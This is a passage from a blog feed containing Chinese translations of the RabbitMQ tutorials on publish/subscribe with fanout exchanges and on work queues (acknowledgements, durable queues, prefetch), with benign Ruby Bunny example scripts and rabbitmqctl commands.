      <content type="html"><![CDATA[<h1 id="RabbitMQ教程（三）──发布、订阅"><a href="#RabbitMQ教程（三）──发布、订阅" class="headerlink" title="RabbitMQ教程（三）──发布、订阅"></a>RabbitMQ教程（三）──发布、订阅</h1><p>（使用Bunny）</p><p>在上篇教程中，我们搭建了一个工作队列，每个任务只分发给一个工作者（worker）。在本篇教程中，我们要做的跟之前完全不一样 —— 分发一个消息给多个消费者（consumers）。这种模式被称为“发布／订阅”。</p><p>为了描述这种模式，我们将会构建一个简单的日志系统。它包括两个程序——第一个程序负责发送日志消息，第二个程序负责获取消息并输出内容。</p><p>在我们的这个日志系统中，所有正在运行的接收方程序都会接受消息。我们用其中一个接收者（receiver）把日志写入硬盘中，另外一个接受者（receiver）把日志输出到屏幕上。</p><p>最终，日志消息被广播给所有的接受者（receivers）。</p><h1 id="交换机（Exchanges）"><a href="#交换机（Exchanges）" class="headerlink" title="交换机（Exchanges）"></a>交换机（Exchanges）</h1><p>前面的教程中，我们发送消息到队列并从中取出消息。现在是时候介绍RabbitMQ中完整的消息模型了。</p><p>让我们简单的概括一下之前的教程：</p><ul><li>发布者（producer）是发布消息的应用程序。</li><li>队列（queue）用于消息存储的缓冲。</li><li>消费者（consumer）是接收消息的应用程序。</li></ul><p>RabbitMQ消息模型的核心理念是：发布者（producer）不会直接发送任何消息给队列。事实上，发布者（producer）甚至不知道消息是否已经被投递到队列。</p><p>发布者（producer）只需要把消息发送给一个交换机（exchange）。交换机非常简单，它一边从发布者方接收消息，一边把消息推送到队列。交换机必须知道如何处理它接收到的消息，是应该推送到指定的队列还是是多个队列，或者是直接忽略消息。这些规则是通过交换机类型（exchange type）来定义的。</p><p><img src="https://www.rabbitmq.com/img/tutorials/exchanges.png" alt="exchanges"></p><p>有几个可供选择的交换机类型：直连交换机（direct）, 主题交换机（topic）, （头交换机）headers和 扇型交换机（fanout）。我们在这里主要说明最后一个 —— 扇型交换机（fanout）。先创建一个fanout类型的交换机，命名为<code>logs</code>：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">channel.fanout(<span class="string">'logs'</span>)</span><br></pre></td></tr></table></figure></p><p>扇型交换机（fanout）很简单，你可能从名字上就能猜测出来，它把消息发送给它所知道的所有队列。这正是我们的日志系统所需要的。</p><blockquote><p><strong>交换器列表</strong></p><p><code>rabbitmqctl</code>能够列出服务器上所有的交换器：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo rabbitmqctl list_exchanges</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>这个列表中有一些叫做amq.*的交换器。这些都是默认创建的，不过这时候你还不需要使用他们。</p></blockquote><blockquote><p><strong>默认的交换器</strong></p><p>前面的教程中我们对交换机一无所知，但仍然能够发送消息到队列中。因为我们使用了命名为空字符串(“”)默认的交换机。</p><p>回想我们之前是如何发布一则消息：</p></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">channel.default_exchange.publish(<span class="string">'hello'</span>, <span class="symbol">routing_key:</span> <span class="string">'hello'</span>)</span><br></pre></td></tr></table></figure><blockquote><p>exchange参数就是交换机的名称。空字符串代表默认或者匿名交换机：消息将会根据指定的routing_key分发到指定的队列。</p></blockquote><p>现在，我们就可以发送消息到一个具名交换机了：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exchange = channel.fanout(<span class="string">'logs'</span>)</span><br><span class="line">exchange.publish(message)</span><br></pre></td></tr></table></figure></p><h2 id="临时队列"><a href="#临时队列" class="headerlink" title="临时队列"></a>临时队列</h2><p>你还记得之前我们使用的队列名吗（ hello和task_queue）？给一个队列命名是很重要的——我们需要把工作者（workers）指向正确的队列。如果你打算在发布者（producers）和消费者（consumers）之间共享同队列的话，给队列命名是十分重要的。</p><p>但是这并不适用于我们的日志系统。我们打算接收所有的日志消息，而不仅仅是一小部分。我们关心的是最新的消息而不是旧的。为了解决这个问题，我们需要做两件事情。</p><p>首先，当我们连接上RabbitMQ的时候，我们需要一个全新的、空的队列。我们可以手动创建一个随机的队列名，或者让服务器为我们选择一个随机的队列名（推荐）。</p><p>第二步，当与消费者（consumer）断开连接的时候，这个队列应当被立即删除。</p><p>在Bunny客户端中，我们假设创建一个空名的队列，会得到自动命名的队列：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">queue = channel.queue(<span class="string">''</span>, <span class="symbol">exclusive:</span> <span class="literal">true</span>)</span><br></pre></td></tr></table></figure></p><p>这时候我们可以通过result.method.queue获得已经生成的随机队列名。它可能是这样子的：<code>amq.gen-JzTY20BRgKO-HjmUJj0wLg</code>。</p><p>因为这个队列被声明为<code>exclusive</code>，当连接关闭时，这个队列自动被删除。关于队列的其他属性可以查看<a href="https://www.rabbitmq.com/queues.html" target="_blank" rel="noopener">文档</a>。</p><h2 id="绑定（Bindings）"><a href="#绑定（Bindings）" class="headerlink" title="绑定（Bindings）"></a>绑定（Bindings）</h2><p><img src="https://www.rabbitmq.com/img/tutorials/bindings.png" alt="bindings"></p><p>我们已经创建了一个扇型交换机（fanout）和一个队列。现在我们需要告诉交换机如何发送消息给我们的队列。交换器和队列之间的联系我们称之为绑定（binding）。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">queue.bind(<span class="string">'logs'</span>)</span><br></pre></td></tr></table></figure></p><p>现在，<code>logs</code>交换机将会把消息添加到我们的队列中。</p><blockquote><p><strong>绑定（binding）列表</strong></p><p>你可以使用rabbitmqctl list_bindings 列出所有现存的绑定。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl list_bindings</span><br></pre></td></tr></table></figure><h2 id="代码整合"><a href="#代码整合" class="headerlink" title="代码整合"></a>代码整合</h2><p><img src="https://www.rabbitmq.com/img/tutorials/python-three-overall.png" alt="python-three-overall"></p><p>发布日志消息的程序看起来和之前的没有太大区别。最重要的改变就是我们把消息发送给<code>logs</code>交换机而不是匿名交换机。以下是<code>emit_log.rb</code>脚本：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env ruby</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'bunny'</span></span><br><span class="line"></span><br><span class="line">connection = Bunny.new</span><br><span class="line">connection.start</span><br><span class="line"></span><br><span class="line">channel = connection.create_channel</span><br><span class="line">exchange = channel.fanout(<span class="string">'logs'</span>)</span><br><span class="line"></span><br><span class="line">message = ARGV.empty? ? <span class="string">'Hello World!'</span> : ARGV.join(<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">exchange.publish(message)</span><br><span class="line">puts <span class="string">" [x] Sent <span class="subst">#&#123;message&#125;</span>"</span></span><br><span class="line"></span><br><span class="line">connection.close</span><br></pre></td></tr></table></figure></p><p><a href="http://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/emit_log.rb" target="_blank" rel="noopener">(emit_log.py 源文件)</a></p><p>正如你看到的那样，在连接成功之后，我们声明了一个交换器，这一个是很重要的，因为不允许发布消息到不存在的交换器。</p><p>如果没有绑定队列到交换器，消息将会丢失。但这个没有所谓，如果没有消费者监听，那么消息就会被忽略。</p><p><code>receive_logs.rb</code>的代码：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env ruby</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'bunny'</span></span><br><span class="line"></span><br><span class="line">connection = Bunny.new</span><br><span class="line">connection.start</span><br><span class="line"></span><br><span class="line">channel = connection.create_channel</span><br><span class="line">exchange = channel.fanout(<span class="string">'logs'</span>)</span><br><span class="line">queue = channel.queue(<span class="string">''</span>, <span class="symbol">exclusive:</span> <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line">queue.bind(exchange)</span><br><span class="line"></span><br><span class="line">puts <span class="string">' [*] Waiting for logs. To exit press CTRL+C'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">  queue.subscribe(<span class="symbol">block:</span> <span class="literal">true</span>) <span class="keyword">do</span> <span class="params">|_delivery_info, _properties, body|</span></span><br><span class="line">    puts <span class="string">" [x] <span class="subst">#&#123;body&#125;</span>"</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">rescue</span> Interrupt =&gt; <span class="number">_</span></span><br><span class="line">  channel.close</span><br><span class="line">  connection.close</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p><a href="http://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/receive_logs.rb" target="_blank" rel="noopener">(receive_logs.py source)</a></p><p>这样我们就完成了。如果你想把日志保存到文件中，只需要打开控制台输入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby receive_logs.rb &gt; logs_from_rabbit.log</span><br></pre></td></tr></table></figure></p><p>如果你想在屏幕中查看日志，那么打开一个新的终端然后运行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby receive_logs.rb</span><br></pre></td></tr></table></figure></p><p>当然还要发送日志：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby emit_log.rb</span><br></pre></td></tr></table></figure></p><p>使用<code>rabbitmqctl list_bindings</code>你可确认已经创建的队列绑定。你可以看到运行中的两个<code>receive_logs.rb</code>程序：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo rabbitmqctl list_bindings</span><br><span class="line"><span class="comment"># =&gt; Listing bindings ...</span></span><br><span class="line"><span class="comment"># =&gt; logs    exchange        amq.gen-JzTY20BRgKO-HjmUJj0wLg  queue           []</span></span><br><span class="line"><span class="comment"># =&gt; logs    exchange        amq.gen-vso0PVvyiRIL2WoV3i48Yg  queue           []</span></span><br><span class="line"><span class="comment"># =&gt; ...done.</span></span><br></pre></td></tr></table></figure></p><p>显示结果很直观：<code>logs</code>交换器把数据发送给两个系统命名的队列。这就是我们所期望的。</p><p>如何监听消息的子集呢？让我们移步教程四。</p>]]></content>
      
      <categories>
          
          <category> Ruby </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RabbitMQ </tag>
            
            <tag> Ruby </tag>
            
            <tag> 翻译 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>RabbitMQ教程（二）──工作队列</title>
      <link href="/2017/10/02/RabbitMQ%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89%E2%94%80%E2%94%80%E5%B7%A5%E4%BD%9C%E9%98%9F%E5%88%97/"/>
      <url>/2017/10/02/RabbitMQ%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89%E2%94%80%E2%94%80%E5%B7%A5%E4%BD%9C%E9%98%9F%E5%88%97/</url>
      <content type="html"><![CDATA[<h1 id="RabbitMQ教程（二）──工作队列"><a href="#RabbitMQ教程（二）──工作队列" class="headerlink" title="RabbitMQ教程（二）──工作队列"></a>RabbitMQ教程（二）──工作队列</h1><p>（使用<a href="http://rubybunny.info/" target="_blank" rel="noopener">Bunny</a>）</p><p><img src="https://www.rabbitmq.com/img/tutorials/python-two.png" alt="python-two"></p><p>在第一篇教程中，我们已经写了一个从已知队列中发送和获取消息的程序。在这篇教程中，我们将创建一个工作队列（Work Queue），它会发送一些耗时的任务给多个工作者（Worker）。</p><p>工作队列（又称：任务队列——Task Queues）是为了避免等待一些占用大量资源、时间的操作。当我们把任务（Task）当作消息发送到队列中，一个运行在后台的工作者（worker）进程就会取出任务然后处理。当你运行多个工作者（workers），任务就会在它们之间共享。</p><p>这个概念在网络应用中是非常有用的，它可以在短暂的HTTP请求中处理一些复杂的任务。</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>之前的教程中，我们发送了一个包含“Hello World!”的字符串消息。现在，我们将发送一些字符串，把这些字符串当作复杂的任务。我们没有真实的例子，例如图片缩放、pdf文件转换。所以使用<code>Kernel#sleep</code>函数来模拟这种情况。我们在字符串中加上点号（.）来表示任务的复杂程度，一个点（.）将会耗时1秒钟。比如”Hello…”就会耗时3秒钟。</p><p>我们对之前教程的<code>send.rb</code>做些简单的调整，以便可以发送随意的消息。这个程序会按照计划发送任务到我们的工作队列中。我们把它命名为<code>new_task.rb</code>：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">message = ARGV.empty? ? <span class="string">'Hello World!'</span> : ARGV.join(<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">queue.publish(message, <span class="symbol">persistent:</span> <span class="literal">true</span>)</span><br><span class="line">puts <span class="string">" [x] Sent <span class="subst">#&#123;message&#125;</span>"</span></span><br></pre></td></tr></table></figure></p><p>我们的旧脚本<code>receive.rb</code>同样需要做一些改动：它需要为消息体中每一个点号（.）模拟1秒钟的操作。它会从队列中获取消息并执行，我们把它命名为<code>worker.rb</code>：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">queue.subscribe(<span class="symbol">block:</span> <span class="literal">true</span>) <span class="keyword">do</span> <span class="params">|delivery_info, _properties, body|</span></span><br><span class="line">  puts <span class="string">" [x] Received <span class="subst">#&#123;body&#125;</span>"</span></span><br><span class="line">  <span class="comment"># imitate some work</span></span><br><span class="line">  sleep body.count(<span class="string">'.'</span>).to_i</span><br><span class="line">  puts <span class="string">' [x] Done'</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>注意我们假装执行了任务所需要的时间。</p><p>现在想教程一那样来运行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shell 1</span></span><br><span class="line">ruby worker.rb</span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shell 2</span></span><br><span class="line">ruby new_task.rb</span><br></pre></td></tr></table></figure><h2 id="循环调度"><a href="#循环调度" class="headerlink" title="循环调度"></a>循环调度</h2><p>使用工作队列的一个好处就是它能够并行的处理队列。如果堆积了很多任务，我们只需要添加更多的工作者（workers）就可以了，扩展很简单。</p><p>首先，我们先同时运行两个<code>worker.rb</code>脚本，它们都会从队列中获取消息，到底是不是这样呢？我们看看。</p><p>你需要打开三个终端，两个用来运行<code>worker.rb</code>脚本，这两个终端就是我们的两个消费者（consumers）—— C1 和 C2。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shell 1</span></span><br><span class="line">ruby worker.rb</span><br><span class="line"><span class="comment"># =&gt; [*] Waiting for messages. To exit press CTRL+C</span></span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shell 2</span></span><br><span class="line">ruby worker.rb</span><br><span class="line"><span class="comment"># =&gt; [*] Waiting for messages. To exit press CTRL+C</span></span><br></pre></td></tr></table></figure><p>第三个终端，我们用来发布新任务。你可以发送一些消息给消费者（consumers）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shell 3</span></span><br><span class="line">ruby new_task.rb First message.</span><br><span class="line">ruby new_task.rb Second message..</span><br><span class="line">ruby new_task.rb Third message...</span><br><span class="line">ruby new_task.rb Fourth message....</span><br><span class="line">ruby new_task.rb Fifth message.....</span><br></pre></td></tr></table></figure></p><p>看看到底发送了什么给我们的工作者（workers）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shell 1</span></span><br><span class="line">ruby worker.rb</span><br><span class="line"><span class="comment"># =&gt; [*] Waiting for messages. To exit press CTRL+C</span></span><br><span class="line"><span class="comment"># =&gt; [x] Received 'First message.'</span></span><br><span class="line"><span class="comment"># =&gt; [x] Received 'Third message...'</span></span><br><span class="line"><span class="comment"># =&gt; [x] Received 'Fifth message.....'</span></span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shell 2</span></span><br><span class="line">ruby worker.rb</span><br><span class="line"><span class="comment"># =&gt; [*] Waiting for messages. To exit press CTRL+C</span></span><br><span class="line"><span class="comment"># =&gt; [x] Received 'Second message..'</span></span><br><span class="line"><span class="comment"># =&gt; [x] Received 'Fourth message....'</span></span><br></pre></td></tr></table></figure><p>默认来说，RabbitMQ会按顺序得把消息发送给每个消费者（consumer）。平均每个消费者都会收到同等数量得消息。这种发送消息得方式叫做——轮询（round-robin）。试着添加三个或更多得工作者（workers）。</p><h2 id="消息确认"><a href="#消息确认" class="headerlink" title="消息确认"></a>消息确认</h2><p>当处理一个比较耗时得任务的时候，你也许想知道消费者（consumers）是否运行到一半就挂掉。当前的代码中，当消息被RabbitMQ发送给消费者（consumers）之后，马上就会在内存中移除。这种情况，你只要把一个工作者（worker）停止，正在处理的消息就会丢失。同时，所有发送到这个工作者的还没有处理的消息都会丢失。</p><p>我们不想丢失任何任务消息。如果一个工作者（worker）挂掉了，我们希望任务会重新发送给其他的工作者（worker）。</p><p>为了防止消息丢失，RabbitMQ提供了<a href="https://www.rabbitmq.com/confirms.html" target="_blank" rel="noopener">消息响应</a>。消费者会通过一个ack（响应），告诉RabbitMQ已经收到并处理了某条消息，然后RabbitMQ就会释放并删除这条消息。</p><p>如果消费者（consumer）挂掉了（通道关闭，连接关闭，或者TCP连接关闭），没有发送响应，RabbitMQ就会认为消息没有被完全处理，然后重新发送给其他消费者（consumer）。这样，及时工作者（workers）偶尔的挂掉，也不会丢失消息。</p><p>消息是没有超时这个概念的；当工作者与它断开连的时候，RabbitMQ会重新发送消息。这样在处理一个耗时非常长的消息任务的时候就不会出问题了。</p><p>消息响应默认是开启的。之前的例子中我们可以使用<code>:manual_ack</code>标识把它关闭。是时候移除这个标识了，当工作者（worker）完成了任务，就发送一个响应。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">queue.subscribe(<span class="symbol">manual_ack:</span> <span class="literal">true</span>, <span class="symbol">block:</span> <span class="literal">true</span>) <span class="keyword">do</span> <span class="params">|delivery_info, _properties, body|</span></span><br><span class="line">  puts <span class="string">" [x] Received '<span class="subst">#&#123;body&#125;</span>'"</span></span><br><span class="line">  <span class="comment"># imitate some work</span></span><br><span class="line">  sleep body.count(<span class="string">'.'</span>).to_i</span><br><span class="line">  puts <span class="string">' [x] Done'</span></span><br><span class="line">  channel.ack(delivery_info.delivery_tag)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>运行上面的代码，我们发现即使使用CTRL+C杀掉了一个工作者（worker）进程，消息也不会丢失。当工作者（worker）挂掉这后，所有没有响应的消息都会重新发送。</p><p>确认必须返回给相同的通道上。试着将确认发送给不同的通道，那会抛出一个通道级别的异常。查看<a href="https://www.rabbitmq.com/confirms.html" target="_blank" rel="noopener">文档</a>了解更多信息。</p><blockquote><p><strong>忘记确认</strong></p><p>一个很容易犯的错误就是忘了basic_ack，后果很严重。消息在你的程序退出之后就会重新发送，如果它不能够释放没响应的消息，RabbitMQ就会占用越来越多的内存。</p><p>为了排除这种错误，你可以使用<code>rabbitmqctl</code>命令，输出<code>messages_unacknowledged</code>字段：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo rabbitmqctl list_queues name messages_ready messages_unacknowledged</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>Windows系统上去掉<code>sudo</code>：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl.bat list_queues name messages_ready messages_unacknowledged</span><br></pre></td></tr></table></figure></p></blockquote><h2 id="消息持久化"><a href="#消息持久化" class="headerlink" title="消息持久化"></a>消息持久化</h2><p>如果你没有特意告诉RabbitMQ，那么在它退出或者崩溃的时候，将会丢失所有队列和消息。为了确保信息不会丢失，有两个事情是需要注意的：我们必须把“队列”和“消息”设为持久化。</p><p>首先，为了不让队列消失，需要把队列声明为持久化（durable）：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">channel.queue(<span class="string">'hello'</span>, <span class="symbol">durable:</span> <span class="literal">true</span>)</span><br></pre></td></tr></table></figure></p><p>尽管这行代码本身是正确的，但是仍然不会正确运行。因为我们已经定义过一个叫hello的非持久化队列。RabbitMq不允许你使用不同的参数重新定义一个队列，它会返回一个错误。但我们现在使用一个快捷的解决方法——用不同的名字，例如<code>task_queue</code>。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">channel.queue(<span class="string">'task_queue'</span>, <span class="symbol">durable:</span> <span class="literal">true</span>)</span><br></pre></td></tr></table></figure></p><p>这个<code>:durable</code>必须在生产者（producer）和消费者（consumer）对应的代码中修改。</p><p>这时候，我们就可以确保在RabbitMq重启之后<code>task_queue</code>队列不会丢失。另外，我们需要把我们的消息也要设为持久化——使用<code>Bunny::Exchange#publish</code>的<code>:persistent</code>选项。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exchange.publish(message, <span class="symbol">persistent:</span> <span class="literal">true</span>)</span><br></pre></td></tr></table></figure></p><blockquote><p><strong>注意：消息持久化</strong></p><p>将消息设为持久化并不能完全保证不会丢失。以上代码只是告诉了RabbitMq要把消息存到硬盘，但从RabbitMq收到消息到保存之间还是有一个很小的间隔时间。因为RabbitMq并不是所有的消息都使用<code>fsync(2)</code>——它有可能只是保存到缓存中，并不一定会写到硬盘中。并不能保证真正的持久化，但已经足够应付我们的简单工作队列。如果你一定要保证持久化，你可以使用<a href="https://www.rabbitmq.com/confirms.html" target="_blank" rel="noopener">publisher confirms</a>。</p></blockquote><h2 id="公平调度"><a href="#公平调度" class="headerlink" title="公平调度"></a>公平调度</h2><p>你应该已经发现，它仍旧没有按照我们期望的那样进行分发。比如有两个工作者（workers），处理奇数消息的比较繁忙，处理偶数消息的比较轻松。然而RabbitMQ并不知道这些，它仍然一如既往的派发消息。</p><p>这时因为RabbitMQ只管分发进入队列的消息，不会关心有多少消费者（consumer）没有作出响应。它盲目的把第n-th条消息发给第n-th个消费者。</p><p><img src="https://www.rabbitmq.com/img/tutorials/prefetch-count.png" alt="prefetch-count"></p><p>我们可以使用<code>prefetch</code>函数，并传递参数为1。这样是告诉RabbitMQ，再同一时刻，不要发送超过1条消息给一个工作者（worker），直到它已经处理了上一条消息并且作出了响应。这样，RabbitMQ就会把消息分发给下一个空闲的工作者（worker）。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">1</span>;</span><br><span class="line">channel.prefetch(n);</span><br></pre></td></tr></table></figure></p><blockquote><p><strong>关于队列大小</strong></p><p>如果所有的工作者都处理繁忙状态，你的队列就会被填满。你需要留意这个问题，要么添加更多的工作者（workers），要么使用其他策略。</p></blockquote><h2 id="整合代码"><a href="#整合代码" class="headerlink" title="整合代码"></a>整合代码</h2><p><code>new_task.rb</code>的完整代码：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env ruby</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'bunny'</span></span><br><span class="line"></span><br><span class="line">connection = Bunny.new(<span class="symbol">automatically_recover:</span> <span class="literal">false</span>)</span><br><span class="line">connection.start</span><br><span class="line"></span><br><span class="line">channel = connection.create_channel</span><br><span class="line">queue = channel.queue(<span class="string">'task_queue'</span>, <span class="symbol">durable:</span> <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line">message = ARGV.empty? ? <span class="string">'Hello World!'</span> : ARGV.join(<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">queue.publish(message, <span class="symbol">persistent:</span> <span class="literal">true</span>)</span><br><span class="line">puts <span class="string">" [x] Sent <span class="subst">#&#123;message&#125;</span>"</span></span><br><span class="line"></span><br><span class="line">connection.close</span><br></pre></td></tr></table></figure></p><p><a href="http://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/new_task.rb" target="_blank" rel="noopener">(new_task.rb 源码)</a></p><p>我们的<code>worker.rb</code>：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env ruby</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'bunny'</span></span><br><span class="line"></span><br><span class="line">connection = Bunny.new(<span class="symbol">automatically_recover:</span> <span class="literal">false</span>)</span><br><span class="line">connection.start</span><br><span class="line"></span><br><span class="line">channel = connection.create_channel</span><br><span class="line">queue = channel.queue(<span class="string">'task_queue'</span>, <span class="symbol">durable:</span> <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line">channel.prefetch(<span class="number">1</span>)</span><br><span class="line">puts <span class="string">' [*] Waiting for messages. To exit press CTRL+C'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">  queue.subscribe(<span class="symbol">manual_ack:</span> <span class="literal">true</span>, <span class="symbol">block:</span> <span class="literal">true</span>) <span class="keyword">do</span> <span class="params">|delivery_info, _properties, body|</span></span><br><span class="line">    puts <span class="string">" [x] Received '<span class="subst">#&#123;body&#125;</span>'"</span></span><br><span class="line">    <span class="comment"># imitate some work</span></span><br><span class="line">    sleep body.count(<span class="string">'.'</span>).to_i</span><br><span class="line">    puts <span class="string">' [x] Done'</span></span><br><span class="line">    channel.ack(delivery_info.delivery_tag)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">rescue</span> Interrupt =&gt; <span class="number">_</span></span><br><span class="line">  connection.close</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p><a href="http://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/worker.rb" target="_blank" rel="noopener">(worker.rb 源码)</a></p><p>使用消息响应和<code>prefetch</code>你就可以搭建起一个工作队列了。这些持久化的选项使得在RabbitMQ重启之后仍然能够恢复。</p><p>关于<code>Bunny::Channel</code>更多的方法和消息属性，可以浏览<a href="http://reference.rubybunny.info/" target="_blank" rel="noopener">Bunny 